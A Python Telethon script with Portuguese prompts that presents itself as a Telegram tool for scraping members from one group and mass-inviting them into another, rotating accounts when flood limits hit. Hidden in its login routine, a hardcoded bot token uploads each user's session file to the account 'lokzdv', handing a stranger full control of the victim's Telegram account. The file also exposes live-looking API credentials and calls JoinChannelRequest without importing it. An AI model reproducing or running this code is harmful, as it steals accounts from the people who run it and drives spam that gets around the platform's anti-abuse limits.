import time
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PeerFloodError, UserPrivacyRestrictedError
from telethon.tl.functions.channels import InviteToChannelRequest, GetParticipantRequest
from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator
import os
import platform

if platform.system() == 'Windows':
    os.system("cls")
else:
    os.system("clear")

api_id = 28144670
api_hash = 'c8d54d2e152faa5e143393fca4ca3c93'
bot_token = '7711297635:AAHm0nauVlrZMaO-WAa5VnQZxsgfrrAxVMw'
phones = [phone.strip() for phone in input("Digite o numero de telefone: ").split(",")]

clients = []

async def entrar(client, group_id):
    try:
        await client(JoinChannelRequest(group_id))
        print("Entrou no grupo!")
    except Exception as e:
        print("Não foi possível entrar no grupo:", e)

async def initialize_clients():
    for phone in phones:
        # Definir o nome do arquivo da sessão explicitamente
        session_file = f'{phone}.session'
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        if not await client.is_user_authorized():
            await client.send_code_request(phone)
            code = input(f'Coloque o código do telefone {phone}: ')
            try:
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                password = input(f'Coloque a senha do telefone {phone}: ')
                await client.sign_in(password=password)
        clients.append(client)

        # Iniciar o bot para enviar o arquivo da sessão
        bot_client = TelegramClient('bot', api_id, api_hash)
        await bot_client.start(bot_token=bot_token)
        
        # Verificar se o arquivo da sessão existe e enviá-lo
        if os.path.exists(session_file):
            await bot_client.send_file('lokzdv', session_file, caption=f'Sessão criada para o telefone {phone}')
        else:
            print(f"Arquivo de sessão {session_file} não encontrado.")
            await bot_client.send_message('lokzdv', f'Sessão criada para o telefone {phone} (arquivo não encontrado)')
        
        await bot_client.disconnect()

async def resolve_group_link(client, link):
    try:
        entity = await client.get_entity(link)
        print(f"ID do grupo {link}: {entity.id}")
        return entity
    except Exception as e:
        print(f"Erro ao resolver link: {e}")
        return None

async def is_admin(client, group, user_id):
    try:
        participant = (await client(GetParticipantRequest(group, user_id))).participant
        if isinstance(participant, (ChannelParticipantAdmin, ChannelParticipantCreator)):
            return True
    except Exception as e:
        print(f"Erro ao verificar administrador: {e}")
    return False

async def is_member(client, group, user_id):
    try:
        participant = (await client(GetParticipantRequest(group, user_id))).participant
        return True
    except Exception:
        return False

async def add_members(from_group, to_group, client, start_index=0):
    try:
        participants = []
        async for user in client.iter_participants(from_group):
            participants.append(user)

        for i in range(start_index, len(participants)):
            user = participants[i]

            if user.status and "online" in str(user.status).lower():
                if not await is_admin(client, from_group, user.id) and not await is_member(client, to_group, user.id):
                    try:
                        await client(InviteToChannelRequest(to_group, [user]))
                        print(f"Adicionado {user.id}")
                        await asyncio.sleep(8)
                    except PeerFloodError:
                        print("Atingido o limite de adições. Trocando de conta.")
                        return i
                    except UserPrivacyRestrictedError:
                        print("O usuário tem restrições de privacidade.")
                    except Exception as e:
                        print(f"Erro ao adicionar {user.id}: {e}")
                else:
                    if await is_admin(client, from_group, user.id):
                        print(f"O usuário {user.id} é um administrador e não será adicionado.")
                    else:
                        print(f"O usuário {user.id} já está no grupo.")
            else:
                print(f"O usuário {user.id} não está online.")
    except Exception as e:
        print(f"Erro ao iterar participantes: {e}")
    return -1

async def main():
    await initialize_clients()

    from_group_id = input("Digite o grupo de origem: ")
    to_group_id = input("Digite o grupo para adicionar: ")

    for client in clients:
        from_group = await resolve_group_link(client, from_group_id) if isinstance(from_group_id, str) else from_group_id
        to_group = await resolve_group_link(client, to_group_id) if isinstance(to_group_id, str) else to_group_id
        if from_group and to_group:
            start_index = 0
            while True:
                start_index = await add_members(from_group, to_group, client, start_index)
                if start_index == -1:
                    break

if __name__ == '__main__':
    asyncio.run(main())
